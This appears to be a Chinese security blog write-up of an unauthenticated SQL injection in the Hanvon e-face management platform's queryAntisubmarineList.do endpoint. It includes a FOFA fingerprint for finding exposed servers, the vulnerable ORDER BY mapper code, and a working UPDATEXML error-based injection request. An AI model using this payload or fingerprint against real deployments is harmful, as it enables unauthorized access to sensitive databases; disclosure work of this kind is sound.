---
title: "汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryantisubmarinelist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/14 12:20
- 1003浏览
- [0评论](#comment)
- 27分钟阅读

深入探索

计算机安全

数据库

认证

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryAntisubmarineList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

在线安全工具

恶意软件分析工具

VPN服务

直接看 `AntisubmarineController` 里关于 `queryAntisubmarineList` 的实现

```
@RequestMapping(
        value = {"queryAntisubmarineList.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson queryAntisubmarineList(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        PageHelper.startPage(page, pageSize);

        try {
            AntiStealthyParams record = new AntiStealthyParams();
            record.setKey(key);
            record.setColumnKey(columnKey);
            record.setOrder(order);
            List<AntiStealthyVO> antiStealthyVOList = this.antisubmarineAsm.queryAntiStealthyList(record);
            PageInfo<AntiStealthyVO> info = new PageInfo(antiStealthyVOList);
            result.setObj(info);
```

深入探索

漏洞扫描器

Web安全课程

Nessus

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessAntisubmarineDao.xml

代码安全审计

```
<select id="queryAntiStealthyList" resultMap="BaseResultMap2">
    select anti.*,dbi.SZ_NAME AS DEVICE_NAME from ACCESS_ANTI_SUBMARINE anti
    left join DEV_DEVICE dbi on dbi.NG_ID = anti.CONTROL_INFO_ID
    where anti.STATE != 1
    AND dbi.nt_state = 1
    <if test="key !=null and key != '' ">
      and dbi.SZ_NAME like CONCAT('%',#{key},'%')
    </if>
    <if test="controlInfoId !=null and controlInfoId != '' ">
      and dbi.NG_ID = #{controlInfoId}
    </if>
    order by
    <if test="order == null or order == ''">
      dbi.ts_last_active desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞](images/img-001-e7dcbbd0a429.webp)](https://image.mrxn.net/ff80c2384685419ebe9e536cb0e87aa0.webp)

成功利用报错注入获取到数据库版本号

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
